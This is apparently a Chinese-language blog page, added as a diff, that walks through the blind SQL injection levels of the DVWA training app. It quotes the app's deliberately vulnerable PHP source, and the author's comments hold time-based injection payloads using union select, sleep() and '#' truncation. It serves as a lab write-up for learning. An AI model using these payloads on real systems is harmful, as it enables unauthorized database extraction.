@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <title> | Sql Injection Blind</title>
+    
+    <link rel="stylesheet" href="https://sdttttt.github.io/style.css?h=a56f213afcf5d255b64918e7a9e0f468ef1d0ac2954b49f36003998666482371">
+    
+</head>
+<body>
+    
+<header class="space">
+    <a href="https:&#x2F;&#x2F;sdttttt.github.io">&LeftArrow; Home</a>
+</header>
+
+    
+<main>
+    <h1>Sql Injection Blind</h1>
+    
+    <p class="secondary">10 April, 2020</p>
+    
+    <div class="space"></div>
+    <p>返回的结果集无法看到，只能通过一些页面显示或状态来判断。
+像瞎子一样。</p>
+<p>DVWA SQL Injection blind 过关秘籍.</p>
+<h3 id="low">Low</h3>
+<pre data-lang="PHP" style="background-color:#2b303b;color:#c0c5ce;" class="language-PHP "><code class="language-PHP" data-lang="PHP"><span>if(isset( $_GET[ &#39;Submit&#39; ])) {
+</span><span>    // Get input
+</span><span>    $id = $_GET[ &#39;id&#39; ];
+</span><span>
+</span><span>    // Check database
+</span><span>    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;
+</span><span>    // 没有一点点防备
+</span><span>    // 尝试构造: (由于看不到结果集，所以脱裤子的语句是无效)
+</span><span>    // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,2 # &#39;;
+</span><span>    // User ID exists in the database. &lt;存在注入漏洞&gt;
+</span><span>    // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,if(length( database())=4,sleep(4),2) # &#39;;
+</span><span>
+</span><span>    $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors
+</span><span>
+</span><span>    // Get results
+</span><span>    $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors
+</span><span>    if( $num &gt; 0 ) {
+</span><span>        // Feedback for end user
+</span><span>        echo &#39;&lt;</span><span style="color:#bf616a;">pre</span><span>&gt;User ID exists in the database.&lt;/</span><span style="color:#bf616a;">pre</span><span>&gt;&#39;;
+</span><span>    }
+</span><span>    else {
+</span><span>        // User wasn&#39;t found, so the page wasn&#39;t!
+</span><span>        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );
+</span><span>
+</span><span>        // Feedback for end user
+</span><span>        echo &#39;&lt;</span><span style="color:#bf616a;">pre</span><span>&gt;User ID is MISSING from the database.&lt;/</span><span style="color:#bf616a;">pre</span><span>&gt;&#39;;
+</span><span>    }
+</span><span>
+</span><span>    mysql_close();
+</span><span>}
+</span></code></pre>
+<h3 id="miedum">MIEDUM</h3>
+<pre data-lang="PHP" style="background-color:#2b303b;color:#c0c5ce;" class="language-PHP "><code class="language-PHP" data-lang="PHP"><span>if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
+</span><span>    // Get input
+</span><span>    $id = $_POST[ &#39;id&#39; ];
+</span><span>    $id = mysql_real_escape_string( $id );
+</span><span>
+</span><span>    // Check database
+</span><span>    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;
+</span><span>    // 尝试构造:
+</span><span>    // SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,2;
+</span><span>    // 以上判断存在注入漏洞
+</span><span>    // SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,if(length(database()) &gt; 4, sleep(3), 2)
+</span><span>
+</span><span>    $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors
+</span><span>
+</span><span>    // Get results
+</span><span>    $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors
+</span><span>    if( $num &gt; 0 ) {
+</span><span>        // Feedback for end user
+</span><span>        echo &#39;&lt;</span><span style="color:#bf616a;">pre</span><span>&gt;User ID exists in the database.&lt;/</span><span style="color:#bf616a;">pre</span><span>&gt;&#39;;
+</span><span>    }
+</span><span>    else {
+</span><span>        // Feedback for end user
+</span><span>        echo &#39;&lt;</span><span style="color:#bf616a;">pre</span><span>&gt;User ID is MISSING from the database.&lt;/</span><span style="color:#bf616a;">pre</span><span>&gt;&#39;;
+</span><span>    }
+</span><span>
+</span><span>    //mysql_close();
+</span><span>}
+</span></code></pre>
+<h3 id="high">High</h3>
+<pre data-lang="PHP" style="background-color:#2b303b;color:#c0c5ce;" class="language-PHP "><code class="language-PHP" data-lang="PHP"><span>if( isset( $_SESSION[&#39;id&#39;])){
+</span><span>    // Get input
+</span><span>    $id = $_SESSION[ &#39;id&#39; ];
+</span><span>
+</span><span>    // Check database
+</span><span>    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;
+</span><span>    // 没有新花样，只限制输出条目是无法拦住我们的
+</span><span>    // 尝试构造:
+</span><span>    // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,if(length(database()) = 4, sleep(3), 2) # LIMIT 1;
+</span><span>    $result = mysql_query( $query ) or die( &#39;&lt;</span><span style="color:#bf616a;">pre</span><span>&gt;Something went wrong.&lt;/</span><span style="color:#bf616a;">pre</span><span>&gt;&#39; );
+</span><span>
+</span><span>    // Get results
+</span><span>    $num = mysql_numrows( $result );
+</span><span>    $i   = 0;
+</span><span>    while( $i &lt; $num ) {
+</span><span>        // Get values
+</span><span>        $first = mysql_result( $result, $i, &quot;first_name&quot; );
+</span><span>        $last  = mysql_result( $result, $i, &quot;last_name&quot; );
+</span><span>
+</span><span>        // Feedback for end user
+</span><span>        echo &quot;&lt;</span><span style="color:#bf616a;">pre</span><span>&gt;ID: {$id}&lt;</span><span style="color:#bf616a;">br </span><span>/&gt;First name: {$first}&lt;</span><span style="color:#bf616a;">br </span><span>/&gt;Surname: {$last}&lt;/</span><span style="color:#bf616a;">pre</span><span>&gt;&quot;;
+</span><span>
+</span><span>        // Increase loop count
+</span><span>        $i++;
+</span><span>    }
+</span><span>
+</span><span>    mysql_close();
+</span><span>}
+</span></code></pre>
+<h3 id="high-1">High</h3>
+<pre data-lang="PHP" style="background-color:#2b303b;color:#c0c5ce;" class="language-PHP "><code class="language-PHP" data-lang="PHP"><span>if( isset( $_GET[ &#39;Submit&#39; ] ) ) {
+</span><span>    // Check Anti-CSRF token
+</span><span>    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+</span><span>
+</span><span>    // Get input
+</span><span>    $id = $_GET[ &#39;id&#39; ];
+</span><span>
+</span><span>    // Was a number entered?
+</span><span>    if(is_numeric( $id )) {
+</span><span>        // Check the database
+</span><span>        // PDO 无法注入
+</span><span>        $data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );
+</span><span>        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );
+</span><span>        $data-&gt;execute();
+</span><span>
+</span><span>        // Get results
+</span><span>        if( $data-&gt;rowCount() == 1 ) {
+</span><span>            // Feedback for end user
+</span><span>            echo &#39;&lt;</span><span style="color:#bf616a;">pre</span><span>&gt;User ID exists in the database.&lt;/</span><span style="color:#bf616a;">pre</span><span>&gt;&#39;;
+</span><span>        }
+</span><span>        else {
+</span><span>            // User wasn&#39;t found, so the page wasn&#39;t!
+</span><span>            header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );
+</span><span>
+</span><span>            // Feedback for end user
+</span><span>            echo &#39;&lt;</span><span style="color:#bf616a;">pre</span><span>&gt;User ID is MISSING from the database.&lt;/</span><span style="color:#bf616a;">pre</span><span>&gt;&#39;;
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span>// Generate Anti-CSRF token
+</span><span>generateSessionToken();
+</span></code></pre>
+
+</main>
+
+    <div class="dark-mode-buttons">
+        <button class="dark-mode-button" id="dark-mode-on"><img src="https://sdttttt.github.io/dark_mode.svg" width="24" height="24" alt="Dark mode" aria-label="dark mode toggle" title="Dark mode"></button>
+        <button class="dark-mode-button" id="dark-mode-off"><img src="https://sdttttt.github.io/light_mode.svg" width="24" height="24" alt="Light mode" aria-label="light mode toggle" title="Light mode"></button>
+    </div>
+    <script>
+        const cls = document.body.classList;
+        const getSessionTheme = sessionStorage.getItem("theme");
+        if (getSessionTheme === "dark") {
+            cls.toggle("dark-mode", true);
+        } else if (getSessionTheme === "light") {
+            cls.toggle("dark-mode", false);
+        } else if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
+            cls.toggle("dark-mode", true);
+        }
+
+        document.getElementById("dark-mode-on").addEventListener("click", function(e) {
+            cls.toggle("dark-mode", true);
+            sessionStorage.setItem("theme", "dark");
+        });
+        document.getElementById("dark-mode-off").addEventListener("click", function(e) {
+            cls.toggle("dark-mode", false);
+            sessionStorage.setItem("theme", "light");
+        });
+    </script>
+    <noscript>
+        <style>
+            .dark-mode-buttons {
+                display: none;
+            }
+        </style>
+    </noscript>
+</body>
+</html>
